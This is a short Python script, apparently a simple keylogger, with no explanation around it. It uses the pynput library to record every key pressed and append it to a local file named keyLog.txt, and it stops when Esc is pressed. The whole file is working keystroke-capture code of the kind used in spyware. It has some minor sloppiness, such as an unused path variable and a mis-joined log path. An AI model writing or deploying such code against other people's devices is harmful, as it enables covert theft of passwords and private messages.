
import pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener
import logging
import os
log_dir         = os.path.dirname(os.path.abspath(__file__))
my_file         = os.path.join(log_dir, 'keyLog.txt')


logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ' '
    if key == "Key.enter":
        key = '\n'

    with open("keyLog.txt", 'a') as f:
        f.write(key)

def key_released(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=log_keystroke, on_release=key_released) as loop:
    loop.join()


